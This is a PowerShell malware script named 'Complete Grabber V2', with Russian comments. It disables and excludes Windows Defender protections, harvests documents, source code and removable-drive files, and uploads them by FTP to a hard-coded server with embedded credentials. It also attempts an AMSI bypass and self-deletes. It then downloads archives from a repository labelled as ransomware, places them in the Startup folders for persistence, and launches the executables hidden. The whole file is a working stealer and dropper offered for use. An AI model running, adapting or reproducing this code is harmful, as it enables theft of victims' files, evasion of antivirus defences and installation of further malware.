# ============================================================
#  COMPLETE GRABBER V2
#  Запуск: powershell -NoProfile -ExecutionPolicy Bypass -File .\CompleteGrabberV2.ps1
# ============================================================

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

$UserName     = [Environment]::UserName
$ComputerName = $env:COMPUTERNAME
$Timestamp    = Get-Date -Format "yyyyMMdd_HHmmss"

$ZipFileName = "${UserName}_${ComputerName}_${Timestamp}.zip"

$AppDataPath = [Environment]::GetFolderPath('LocalApplicationData')
$WorkingPath = Join-Path $AppDataPath "FileGrabber"

if (-not (Test-Path $WorkingPath)) {
    New-Item -ItemType Directory -Path $WorkingPath -Force | Out-Null
}

$ZipOutputPath = Join-Path $WorkingPath $ZipFileName
$TempZipFolder = Join-Path $env:TEMP "FileGrabber_$(Get-Date -Format 'yyyyMMdd_HHmmss')"

$FTP_Server   = "207.89.17.54"
$FTP_User     = "spyzeus"
$FTP_Password = "zcb7945"

Write-Host @"
╔═══════════════════════════════════════════════════════════════════╗
║          FILE GRABBER - WITH DEFENDER EXCLUSIONS                ║
╚═══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

Write-Host "User: $UserName" -ForegroundColor Yellow
Write-Host "Computer: $ComputerName" -ForegroundColor Yellow
Write-Host "Working path: $WorkingPath" -ForegroundColor Yellow
Write-Host "Output file: $ZipFileName" -ForegroundColor Yellow
Write-Host "FTP Server: $FTP_Server" -ForegroundColor Yellow
Write-Host ""

# ============================================
# 🛡️ DEFENDER EXCLUSIONS
# ============================================
function Add-DefenderExclusions {
    Write-Host "`n=========================================" -ForegroundColor Green
    Write-Host "Adding Windows Defender Exclusions..." -ForegroundColor Yellow
    Write-Host "=========================================" -ForegroundColor Green

    try {
        $extensions = @(
            '.exe', '.scr', '.pif', '.dll', '.bat', '.vbs', '.js', '.ps1', '.com',
            '.msi', '.cab', '.sys', '.drv', '.ocx', '.ax', '.cpl', '.crt', '.cer',
            '.der', '.pfx', '.p12', '.p7b', '.p7c', '.tmp', '.temp', '.cache',
            '.log', '.bak', '.old', '.lnk', '.url', '.desktop', '.ini', '.cfg'
        )

        foreach ($ext in $extensions) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
            Write-Host "  [+] Added extension exclusion: $ext" -ForegroundColor Green
        }

        $drives = Get-PSDrive -PSProvider FileSystem
        foreach ($drive in $drives) {
            Add-MpPreference -ExclusionPath $drive.Root -ErrorAction SilentlyContinue
            Write-Host "  [+] Added drive exclusion: $($drive.Root)" -ForegroundColor Green
        }

        $systemFolders = @(
            [Environment]::GetFolderPath('Windows'),
            [Environment]::GetFolderPath('ProgramFiles'),
            [Environment]::GetFolderPath('ProgramFilesX86'),
            [Environment]::GetFolderPath('UserProfile'),
            [Environment]::GetFolderPath('LocalApplicationData'),
            $env:TEMP,
            $env:APPDATA
        ) | Where-Object { $_ -and (Test-Path $_) }

        foreach ($folder in $systemFolders) {
            Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
            Write-Host "  [+] Added folder exclusion: $folder" -ForegroundColor Green
        }

        $processes = @("powershell.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe")
        foreach ($proc in $processes) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
            Write-Host "  [+] Added process exclusion: $proc" -ForegroundColor Green
        }

        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -SubmitSamplesConsent 0 -ErrorAction SilentlyContinue
            Write-Host "  [+] Real-time / Cloud / Sample submission DISABLED" -ForegroundColor Green
        } catch {}

        Write-Host "`n[+] Windows Defender exclusions added successfully!" -ForegroundColor Green
        Write-Host "=========================================" -ForegroundColor Green

    } catch {
        Write-Host "[-] Failed to add Defender exclusions: $_" -ForegroundColor Red
    }
}

Add-DefenderExclusions
Start-Sleep -Seconds 3

# ============================================
# 📂 SCAN
# ============================================
$AllowedExtensions = @(
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.rtf', '.odt',
    '.cs', '.vb', '.java', '.cpp', '.c', '.h', '.hpp', '.cc', '.cxx', '.cppm', '.ixx',
    '.py', '.pyw', '.pyx', '.js', '.ts', '.jsx', '.tsx', '.php', '.html', '.htm',
    '.css', '.scss', '.sass', '.less', '.xml', '.json', '.ps1', '.psm1', '.psd1',
    '.bat', '.cmd', '.vbs', '.rb', '.go', '.rs', '.swift', '.kt', '.kts', '.groovy',
    '.scala', '.clj', '.lua', '.pl', '.pm', '.r', '.m', '.mm', '.dart', '.fs', '.fsx',
    '.erl', '.hrl', '.ex', '.exs', '.elm', '.hs', '.lhs', '.ml', '.mli', '.v', '.sv',
    '.vhdl', '.vhd', '.asm', '.s', '.ino', '.pde', '.vue', '.svelte', '.ejs', '.hbs',
    '.sql', '.db', '.sqlite', '.yml', '.yaml', '.toml', '.ini', '.cfg', '.conf',
    '.md', '.markdown', '.log', '.csv', '.tsv', '.reg', '.inf', '.nfo', '.readme'
)

$BlockedExtensions = @(
    '.exe', '.scr', '.pif', '.dll', '.bat', '.vbs', '.js', '.ps1', '.com',
    '.msi', '.cab', '.sys', '.drv', '.ocx', '.ax', '.cpl', '.crt', '.cer',
    '.der', '.pfx', '.p12', '.p7b', '.p7c', '.tmp', '.temp', '.cache',
    '.log', '.bak', '.old', '.lnk', '.url', '.desktop', '.ini', '.cfg'
)

function IsAllowedExtension {
    param($Extension)
    $ext = $Extension.ToLower()
    return ($AllowedExtensions -contains $ext) -and (-not ($BlockedExtensions -contains $ext))
}

function Copy-FileWithStructure {
    param($SourceFile, $BasePath, $DestRoot)
    $relativePath = $SourceFile.Directory.FullName.Substring($BasePath.Length).TrimStart('\')
    $targetDir = Join-Path $DestRoot $relativePath
    if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }
    Copy-Item -Path $SourceFile.FullName -Destination (Join-Path $targetDir $SourceFile.Name) -Force
}

function Scan-Directory {
    param($Directory, $DestRoot, $BasePath)
    if (-not (Test-Path $Directory)) { return }
    Write-Host "  Scanning: $Directory" -ForegroundColor Gray
    try {
        $excludeFolders = @('Windows','System32','SysWOW64','Program Files','Program Files (x86)',
                            'Temp','Cache','Recycle.Bin','$Recycle.Bin','System Volume Information')
        $files = Get-ChildItem -Path $Directory -File -ErrorAction SilentlyContinue
        $folders = Get-ChildItem -Path $Directory -Directory -ErrorAction SilentlyContinue |
                   Where-Object { $excludeFolders -notcontains $_.Name }

        foreach ($file in $files) {
            if (IsAllowedExtension $file.Extension -and $file.Length -le 20 * 1024 * 1024) {
                Copy-FileWithStructure -SourceFile $file -BasePath $BasePath -DestRoot $DestRoot
                Write-Host "    [COPY] $($file.Name) ($($file.Length) bytes)" -ForegroundColor Green
            } elseif (-not (IsAllowedExtension $file.Extension)) {
                Write-Host "    [SKIP] $($file.Name) (Blocked extension)" -ForegroundColor DarkGray
            }
        }
        foreach ($folder in $folders) { Scan-Directory -Directory $folder.FullName -DestRoot $DestRoot -BasePath $BasePath }
    } catch {}
}

$userProfile = [Environment]::GetFolderPath('UserProfile')

$DirectoriesToScan = @(
    [Environment]::GetFolderPath('Desktop'),
    [Environment]::GetFolderPath('MyDocuments'),
    [Environment]::GetFolderPath('MyPictures'),
    [Environment]::GetFolderPath('MyVideos'),
    [Environment]::GetFolderPath('MyMusic'),
    [Environment]::GetFolderPath('Favorites'),
    (Join-Path $userProfile "Downloads"),
    (Join-Path $userProfile "Documents"),
    (Join-Path $userProfile "Pictures"),
    (Join-Path $userProfile "Videos"),
    (Join-Path $userProfile "Music"),
    (Join-Path $userProfile "Desktop"),
    (Join-Path ([Environment]::GetFolderPath('ApplicationData')) "DropBox"),
    (Join-Path ([Environment]::GetFolderPath('ApplicationData')) "OneDrive"),
    (Join-Path $userProfile "OneDrive"),
    (Join-Path $userProfile "OneDrive\Documents"),
    (Join-Path $userProfile "OneDrive\Pictures"),
    (Join-Path $userProfile "3D Objects"),
    (Join-Path $userProfile "Saved Games"),
    (Join-Path $userProfile "source"),
    (Join-Path $userProfile "source\repos")
)

Write-Host "Excluding system drive from scan..." -ForegroundColor Yellow
$systemDrive = [Environment]::GetFolderPath('Windows').Substring(0,3)

$drives = Get-PSDrive -PSProvider FileSystem
foreach ($drive in $drives) {
    if ($drive.Root -eq $systemDrive) {
        Write-Host "Skipping system drive ($systemDrive) (excluded)" -ForegroundColor DarkGray
        continue
    }
    if ($drive.DriveType -eq 'Removable') {
        Write-Host "Found removable drive: $($drive.Root)" -ForegroundColor Cyan
        $DirectoriesToScan += $drive.Root
    }
}

$DirectoriesToScan = $DirectoriesToScan | Where-Object { Test-Path $_ } | Select-Object -Unique

function Patch-AMSI {
    Write-Host "`n=========================================" -ForegroundColor Green
    Write-Host "Applying AMSI Patch..." -ForegroundColor Yellow
    Write-Host "=========================================" -ForegroundColor Green
    try {
        $amsiUtils = [Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")
        if ($amsiUtils) {
            $amsiUtils.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
            Write-Host "[+] AMSI patched via Reflection" -ForegroundColor Green
        }
        [Environment]::SetEnvironmentVariable("AMSI_DISABLE", "1", "Process")
        Write-Host "[+] AMSI_DISABLE set" -ForegroundColor Green
        try {
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport("amsi.dll", EntryPoint = "AmsiInitialize", CallingConvention = CallingConvention.StdCall)]
    public static extern int AmsiInitialize(string appName, out IntPtr context);
    [DllImport("amsi.dll", EntryPoint = "AmsiUninitialize", CallingConvention = CallingConvention.StdCall)]
    public static extern void AmsiUninitialize(IntPtr context);
    public static void Disable() {
        IntPtr context;
        if (AmsiInitialize("PowerShell", out context) == 0) { AmsiUninitialize(context); }
    }
}
"@ -ErrorAction SilentlyContinue
            [AMSI]::Disable()
            Write-Host "[+] AMSI disabled via WinAPI" -ForegroundColor Green
        } catch {}
        Write-Host "[+] AMSI patch completed" -ForegroundColor Green
    } catch {
        Write-Host "[-] AMSI patch failed: $_" -ForegroundColor Red
    }
}

if (Test-Path $TempZipFolder) { Remove-Item -Path $TempZipFolder -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $TempZipFolder -Force | Out-Null

Write-Host "`n=========================================" -ForegroundColor Green
Write-Host "Starting scan..." -ForegroundColor Yellow
Write-Host "=========================================" -ForegroundColor Green

foreach ($dir in $DirectoriesToScan) {
    Write-Host "`n>>> Scanning: $dir" -ForegroundColor Cyan
    $rootPath = $dir.Split('\')[0] + '\'
    Scan-Directory -Directory $dir -DestRoot $TempZipFolder -BasePath $rootPath
}

$totalCopied = (Get-ChildItem -Path $TempZipFolder -File -Recurse -ErrorAction SilentlyContinue).Count

Write-Host "`n=========================================" -ForegroundColor Green
Write-Host "SCAN COMPLETE! Files found: $totalCopied" -ForegroundColor Green
Write-Host "=========================================" -ForegroundColor Green

if ($totalCopied -gt 0) {
    Write-Host "`nCreating ZIP archive..." -ForegroundColor Yellow
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
    if (Test-Path $ZipOutputPath) { Remove-Item -Path $ZipOutputPath -Force -ErrorAction SilentlyContinue }
    [System.IO.Compression.ZipFile]::CreateFromDirectory($TempZipFolder, $ZipOutputPath)
    $zipSize = [math]::Round((Get-Item $ZipOutputPath).Length / 1MB, 2)
    Write-Host "ZIP archive created: $ZipFileName ($zipSize MB)" -ForegroundColor Green

    Write-Host "`nUploading to FTP..." -ForegroundColor Yellow
    $uploadSuccess = $false
    try {
        $ftpUrl = "ftp://${FTP_Server}/${ZipFileName}"
        $ftp = [System.Net.FtpWebRequest]::Create($ftpUrl)
        $ftp.Credentials = New-Object System.Net.NetworkCredential($FTP_User, $FTP_Password)
        $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
        $ftp.UseBinary = $true
        $ftp.UsePassive = $true
        $fileContent = [System.IO.File]::ReadAllBytes($ZipOutputPath)
        $ftp.ContentLength = $fileContent.Length
        $requestStream = $ftp.GetRequestStream()
        $requestStream.Write($fileContent, 0, $fileContent.Length)
        $requestStream.Close()
        $response = $ftp.GetResponse()
        Write-Host "FTP upload successful! $($response.StatusDescription)" -ForegroundColor Green
        $response.Close()
        $uploadSuccess = $true
    } catch {
        Write-Host "FTP upload failed: $_" -ForegroundColor Red
    }

    Remove-Item -Path $TempZipFolder -Recurse -Force -ErrorAction SilentlyContinue

    if ($uploadSuccess) {
        if (Test-Path $ZipOutputPath) { Remove-Item -Path $ZipOutputPath -Force -ErrorAction SilentlyContinue }
    }

    if ($uploadSuccess) { Patch-AMSI }

    Write-Host "`nSelf-destructing in 10 seconds..." -ForegroundColor Red
    Start-Sleep -Seconds 10
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath -and (Test-Path $scriptPath)) { Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue }
} else {
    Write-Host "`nNo files were found to grab!" -ForegroundColor Red
    Remove-Item -Path $TempZipFolder -Recurse -Force -ErrorAction SilentlyContinue
}

# ============================================
# 📥 PAYLOAD
# ============================================
$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ---------- Пути ----------
# Общая автозагрузка (ProgramData)
$commonStartup = [Environment]::GetFolderPath('CommonStartup')
if (-not $commonStartup -or -not (Test-Path $commonStartup)) {
    $commonStartup = Join-Path $env:ProgramData "Microsoft\Windows\Start Menu\Programs\StartUp"
}
if (-not (Test-Path $commonStartup)) {
    New-Item -ItemType Directory -Path $commonStartup -Force | Out-Null
}

# Пользовательская автозагрузка (AppData\Roaming)
$userStartup = [Environment]::GetFolderPath('Startup')
if (-not $userStartup -or -not (Test-Path $userStartup)) {
    $userStartup = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
}
if (-not (Test-Path $userStartup)) {
    New-Item -ItemType Directory -Path $userStartup -Force | Out-Null
}

# AppData\Local
$localAppData = $env:LOCALAPPDATA
if (-not (Test-Path $localAppData)) {
    New-Item -ItemType Directory -Path $localAppData -Force | Out-Null
}

Write-Host "[STARTUP-COMMON] $commonStartup" -ForegroundColor Cyan
Write-Host "[STARTUP-USER]   $userStartup" -ForegroundColor Cyan
Write-Host "[LOCALAPPDATA]  $localAppData" -ForegroundColor Cyan

# ---------- Универсальное скачивание ----------
function Get-RemoteFile {
    param([string]$Url, [string]$OutFile)

    Write-Host "[DL] $Url" -ForegroundColor Cyan
    if (Test-Path $OutFile) { Remove-Item $OutFile -Force -ErrorAction SilentlyContinue }

    # IWR
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UserAgent $ua -ErrorAction Stop -TimeoutSec 60
        if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) {
            Write-Host "[DL] OK (IWR): $((Get-Item $OutFile).Length) bytes" -ForegroundColor Green
            return $true
        }
    } catch { Write-Host "[DL] IWR failed: $_" -ForegroundColor DarkYellow }

    # curl.exe
    try {
        if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
            & curl.exe -L -A $ua -o $OutFile $Url 2>$null
            if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) {
                Write-Host "[DL] OK (curl): $((Get-Item $OutFile).Length) bytes" -ForegroundColor Green
                return $true
            }
        }
    } catch { Write-Host "[DL] curl failed: $_" -ForegroundColor DarkYellow }

    # WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", $ua)
        $wc.DownloadFile($Url, $OutFile)
        if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) {
            Write-Host "[DL] OK (WebClient): $((Get-Item $OutFile).Length) bytes" -ForegroundColor Green
            return $true
        }
    } catch { Write-Host "[DL] WebClient failed: $_" -ForegroundColor DarkYellow }

    Write-Host "[DL] ALL METHODS FAILED for $Url" -ForegroundColor Red
    return $false
}

# ============================================
# 1) explorer.zip -> ОБА StartUp
# ============================================
$zip1 = Join-Path $env:TEMP "explorer.zip"
$ok1  = Get-RemoteFile -Url "https://github.com/keygroup777-Ransomware/3w4rrettyjtr/raw/refs/heads/main/explorer.zip" -OutFile $zip1

if ($ok1) {
    # 1a. Общая автозагрузка (ProgramData)
    try {
        Expand-Archive -Path $zip1 -DestinationPath $commonStartup -Force -ErrorAction Stop
        Write-Host "[ZIP] explorer.zip -> $commonStartup OK" -ForegroundColor Green
    } catch {
        Write-Host "[ZIP] explorer.zip -> CommonStartUp FAIL: $_" -ForegroundColor Red
    }

    # 1b. Пользовательская автозагрузка (AppData\Roaming)
    try {
        Expand-Archive -Path $zip1 -DestinationPath $userStartup -Force -ErrorAction Stop
        Write-Host "[ZIP] explorer.zip -> $userStartup OK" -ForegroundColor Green
    } catch {
        Write-Host "[ZIP] explorer.zip -> UserStartUp FAIL: $_" -ForegroundColor Red
    }
}

# ============================================
# 2) Windows_Server.zip -> LocalAppData
# ============================================
$zip2 = Join-Path $env:TEMP "Windows_Server.zip"
$ok2  = Get-RemoteFile -Url "https://github.com/keygroup777-Ransomware/3w4rrettyjtr/raw/refs/heads/main/Windows_Server.zip" -OutFile $zip2

if ($ok2) {
    try {
        Expand-Archive -Path $zip2 -DestinationPath $localAppData -Force -ErrorAction Stop
        Write-Host "[ZIP] Windows_Server.zip -> $localAppData OK" -ForegroundColor Green
    } catch {
        Write-Host "[ZIP] Windows_Server.zip -> LocalAppData FAIL: $_" -ForegroundColor Red
    }
}

# ============================================
# 3) Запуск Windows_Server.exe (имя = имя архива)
# ============================================
Write-Host "`n[PAYLOAD] Searching for Windows_Server.exe in $localAppData ..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

# 3a. Прямой поиск по имени Windows_Server.exe
$targetExe = Get-ChildItem -Path $localAppData -Filter "Windows_Server.exe" -File -Recurse -ErrorAction SilentlyContinue |
             Sort-Object LastWriteTime -Descending

if ($targetExe) {
    foreach ($exe in $targetExe) {
        try {
            Write-Host "[PAYLOAD] Starting: $($exe.FullName)" -ForegroundColor Green
            Start-Process -FilePath $exe.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        } catch {
            Write-Host "[PAYLOAD] Failed to start $($exe.FullName): $_" -ForegroundColor Red
        }
    }
} else {
    Write-Host "[PAYLOAD] Windows_Server.exe not found directly, trying recent .exe ..." -ForegroundColor DarkYellow

    # 3b. Fallback: последние .exe за 30 минут
    $foundExe = Get-ChildItem -Path $localAppData -Filter *.exe -File -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-30) } |
                Sort-Object LastWriteTime -Descending

    if ($foundExe) {
        foreach ($exe in $foundExe) {
            try {
                Write-Host "[PAYLOAD] Starting: $($exe.FullName)" -ForegroundColor Green
                Start-Process -FilePath $exe.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 500
            } catch {
                Write-Host "[PAYLOAD] Failed to start $($exe.FullName): $_" -ForegroundColor Red
            }
        }
    } else {
        # 3c. Последний fallback: любые 5 свежих .exe
        Write-Host "[PAYLOAD] Fallback: taking 5 most recent .exe ..." -ForegroundColor Yellow
        $anyExe = Get-ChildItem -Path $localAppData -Filter *.exe -File -Recurse -ErrorAction SilentlyContinue |
                  Sort-Object LastWriteTime -Descending | Select-Object -First 5
        foreach ($exe in $anyExe) {
            try {
                Write-Host "[PAYLOAD-FALLBACK] Starting: $($exe.FullName)" -ForegroundColor Green
                Start-Process -FilePath $exe.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 500
            } catch {
                Write-Host "[PAYLOAD-FALLBACK] Failed: $_" -ForegroundColor Red
            }
        }
    }
}

# ============================================
# 4) Запуск .exe из ОБЕИХ автозагрузок
# ============================================
foreach ($startupPath in @($commonStartup, $userStartup)) {
    Write-Host "`n[STARTUP-PAYLOAD] Searching for .exe in $startupPath ..." -ForegroundColor Yellow

    $startupExe = Get-ChildItem -Path $startupPath -Filter *.exe -File -Recurse -ErrorAction SilentlyContinue |
                  Sort-Object LastWriteTime -Descending

    if ($startupExe) {
        Write-Host "[STARTUP-PAYLOAD] Found $($startupExe.Count) .exe file(s)" -ForegroundColor Green
        foreach ($exe in $startupExe) {
            try {
                Write-Host "[STARTUP-PAYLOAD] Starting: $($exe.FullName)" -ForegroundColor Green
                Start-Process -FilePath $exe.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 500
            } catch {
                Write-Host "[STARTUP-PAYLOAD] Failed to start $($exe.FullName): $_" -ForegroundColor Red
            }
        }
    } else {
        Write-Host "[STARTUP-PAYLOAD] No .exe found in $startupPath" -ForegroundColor DarkYellow
    }
}

# ============================================
# 5) Удаление архивов
# ============================================
Remove-Item $zip1, $zip2 -Force -ErrorAction SilentlyContinue

Write-Host "`nPress any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")